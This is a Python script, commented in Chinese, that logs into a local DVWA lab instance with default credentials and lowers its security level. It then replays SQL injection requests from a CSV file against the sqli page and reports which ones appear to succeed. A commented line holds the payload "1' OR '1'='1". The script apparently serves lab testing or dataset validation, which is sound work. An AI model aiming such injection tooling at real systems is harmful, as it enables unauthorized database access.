import csv
import requests
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup

DVWA_BASE = 'http://localhost:8080'
LOGIN_URL = f'{DVWA_BASE}/login.php'
ATTACK_URL = f'{DVWA_BASE}/vulnerabilities/sqli/'
DATASET = 'SQL.csv'

def get_csrf_token(session):
    """ 從 login.php 擷取 CSRF Token（如果有）"""
    resp = session.get(LOGIN_URL)
    soup = BeautifulSoup(resp.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})
    return token['value'] if token else None

def login(session):
    """登入 DVWA 並設定安全等級為 low"""
    token = get_csrf_token(session)
    payload = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
    }
    if token:
        payload['user_token'] = token
    resp = session.post(LOGIN_URL, data=payload)
    if 'DVWA Security' in resp.text:
        print("✅ 登入成功")

        # 設定安全等級為 low
        security_url = f"{DVWA_BASE}/security.php"
        token = get_csrf_token(session)
        security_data = {'security': 'low', 'seclev_submit': 'Submit'}
        if token:
            security_data['user_token'] = token
        session.post(security_url, data=security_data)
    else:
        print("❌ 登入失敗")
        exit(1)

def test_sqli(session, row):
    # attack_url = ATTACK_URL
    # params = {
    #     'id': "1' OR '1'='1",  # 常見成功注入語法
    #     'Submit': 'Submit'
    # }

    # response = session.get(attack_url, params=params)

    # print(f"🔗 發送請求: {response.url}")
    # # print(f"📥 回應狀態碼: {response.status_code}")
    # # print("🔒 頁面部分回應內容：")
    # # print(response.text)  # 印前 500 字

    # if "First name" in response.text:
    #     print("✅ 成功查詢（可能成功攻擊）")
    # elif "You have an error in your SQL syntax" in response.text:
    #     print("⚠️ SQL 錯誤偵測到！")
    # elif "You must be logged in" in response.text:
    #     print("🚫 沒有登入，請確認 login() 有成功")
    # else:
    #     print("❓ 回應不明")

    method = row['method'].upper()
    url = ATTACK_URL
    headers = {
        'User-Agent': row['user_agent'],
        'Referer': row['refer']
    }

    data = {}
    params = {}

    if method == 'GET':
        parsed = parse_qs(urlparse(row['url']).query)
        params = {k: v[0] for k, v in parsed.items()}
        params['Submit'] = 'Submit'
    elif method == 'POST':
        parsed = parse_qs(row['body'])
        data = {k: v[0] for k, v in parsed.items()}
        data['Submit'] = 'Submit'
    else:
        data = row['body']

    try:
        response = session.request(
            method=method,
            url=url,
            headers=headers,
            params=params,
            data=data
        )
    except requests.exceptions.RequestException as e:
        print(f"[{row['id']}] ❌ 發送失敗：{e}")
        return

    success = False
    if "First name" in response.text:
        print(f"[{row['id']}] ✅ 成功查詢（可能成功攻擊）")
        success = True
    elif "You have an error in your SQL syntax" in response.text:
        print(f"[{row['id']}] ⚠️ SQL 錯誤偵測到")
        # print("=== 🔼 發送的 Request ===")
        # print(f"Method: {method}")
        # print(f"URL: {response.url}")
        # print(f"Headers: {headers}")
        # if method != 'GET':
        #     print(f"Body: {data}")
        # print("=" * 50)
        # success = True
    elif "You must be logged in" in response.text:
        print(f"[{row['id']}] 🚫 未登入")
    elif response.status_code == 405:
        print(f"[{row['id']}] 🚫 方法不允許（Method Not Allowed）")
    else:
        return  # 不成功也不錯誤就略過

    if success:
        # 輸出請求資訊
        print("=== 🔼 發送的 Request ===")
        print(f"Method: {method}")
        print(f"URL: {response.url}")
        print(f"Headers: {headers}")
        if method != 'GET':
            print(f"Body: {data}")
        # print("---")

        # 輸出部分回應
        # print("=== 🔽 回應內容 ===")
        # print(response.text)
        print("=" * 50)


def load_csv(filename):
    with open(filename, newline='', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        return list(reader)

def main():
    session = requests.Session()
    login(session)
    rows = load_csv(DATASET)
    for row in rows:
        test_sqli(session, row)

if __name__ == "__main__":
    main()
